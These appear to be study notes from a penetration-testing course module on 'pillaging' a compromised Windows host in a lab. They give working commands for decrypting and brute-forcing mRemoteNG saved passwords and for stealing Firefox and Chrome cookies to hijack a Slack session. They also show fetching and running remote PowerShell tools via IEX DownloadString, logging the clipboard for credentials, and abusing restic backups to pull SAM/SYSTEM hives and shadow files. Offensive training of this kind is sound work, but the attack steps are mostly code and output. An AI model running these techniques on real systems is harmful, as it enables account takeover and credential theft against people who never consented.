- Pillaging is the process of obtaining information from a compromised system. 
- The data points that we collect 

**Data Points**

 Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

--------
### Scenario
- Let's assume that we have gained a foothold on the Windows server mentioned in the in the below network and start collecting as much information as possible. 
![[Pasted image 20251215190052.png]]

-------
### Installed Applications

- Understanding the applications that are installed on the system is a crucial part in achieving total dominance of the network. 
- We can use the `dir` and `ls` commands to view the contents of `Program Files` or `Program Files (x86)` to find which applications are installed. 

**Identifying Common Applications**

```cmd-session
C:\>dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe
05/16/2022  12:33 PM    <DIR>          Corsair
05/16/2022  10:17 AM    <DIR>          Google
05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
07/10/2022  11:30 AM    <DIR>          mRemoteNG
07/13/2022  09:14 AM    <DIR>          OpenVPN
07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
07/20/2022  07:06 AM    <DIR>          TeamViewer
               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```

An alternative is to use PowerShell and read the Windows registry to collect more granular information about installed programs. 

```powershell-session
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
...SNIP...
```

We can see that the application `mRemoteNG` software is installed on the system. 

**mRemoteNG**
- `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`. They use hardcoded master password, `mR3m,` so if anyone starts saving credentials in mRemoteNG and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them. 

Default Configuration File Location: `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

**Discover mRemoteNG Configuration Files**

```powershell-session
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

- Let's take a look at the contents of that file. 

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password. We need to copy the attribute `Password` content and use it with the option `-s`. If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

**Decrypting the Password with mremoteng_decrypt**

```shell-session
realCustampin@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

Now, let's take a look at the encrypted configuration file with a custom password. 

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```

**Attempting to Decrypt the Password with a Custom Password**

```shell-session
realCustampin@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (most recent call last):
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
    main()
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
    self.verify(received_mac_tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
    raise ValueError("MAC check failed")
ValueError: MAC check failed
```

**Decrypting the Password with mremoteng_decrypt and a Custom Password**
```shell-session
realCustampin@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

**Using a for loop to Crack the Master Password with mremoteng_decrypt**
```shell-session
realCustampin@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```

-----
### Abusing Cookies to Get Access to IM Clients

There are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients. Understanding how to abuse credentials, cookies, and tokens is often helpful in accessing web applications such as IM Clients.

Let's use `Slack` as an example. Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

There's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.

##### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

**Copy Firefox Cookies Database**

```powershell-session
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
- We can copy the file to our machine and use the Pyton script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

**Extract Slack Cookie from Firefox Cookies Database**

```shell-session
realCustampin@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. Once the extension is installed, you will see something like this:

![Mozilla Firefox in Private Browsing mode. Cookie Editor open, displaying message: 'This page does not have any cookies.' Options include Show Advanced, add, delete, and export cookies.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/cookie-editor-extension.jpg)

Our target website is `slack.com`. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the `d` cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).

![Mozilla Firefox on Slack page with Cookie Editor open. Cookie 'd' selected, showing value 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSC...'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/replace-cookie.jpg)

Once we have saved the cookie, we are now able to refresh the page and see what happens. 

![[Pasted image 20251215192704.png]]

Now we are logged in as the user and can click on `Launch Slack`. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

![[Pasted image 20251215192721.png]]

Now that we have access to slack, we can search for common words that may give us information that may give us information. 
![[Pasted image 20251215192741.png]]

**Cookie Extraction from Chromium-based Browsers**

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.

**PowerShell Script - Invoke-SharpChromium**

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.
```
 - `SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

**Copy Cookies to SharpChromium Expected Location**

```powershell-session
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

- We can now use Invoke-SharpChromium gain to get a list of cookies in JSON Format. 

```powershell-session
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

--------
### Clipboard

In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard` provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

#### Monitor the Clipboard with PowerShell

  Pillaging

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

#### Capture Credentials from the Clipboard with Invoke-ClipboardLogger

  Pillaging

```powershell-session
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

**Note:** User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.

-------
### Roles and Services

Services on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:

- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

Let's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.

#### Attacking Backup Servers

In information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.

Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use [restic](https://restic.net/) as an example. `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

To start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\Windows\System32\restic.exe`.

We first need to create and initialize the location where our backup will be saved, called the `repository`.

#### restic - Initialize Backup Directory

  Pillaging

```powershell-session
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Then we can create our first backup.

#### restic - Back up a Directory

  Pillaging

```powershell-session
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

#### restic - Back up a Directory with VSS

  Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

**Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

We can also check which backups are saved in the repository using the `snapshot` command.

#### restic - Check Backups Saved in a Repository

  Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

We can restore a backup using the ID.

#### restic - Restore a Backup with ID

  Pillaging

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.

We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.

If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.

**Note:** restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.

Hundreds of applications and methods exist to perform backups, and we cannot detail each. This `restic` case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.

As we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.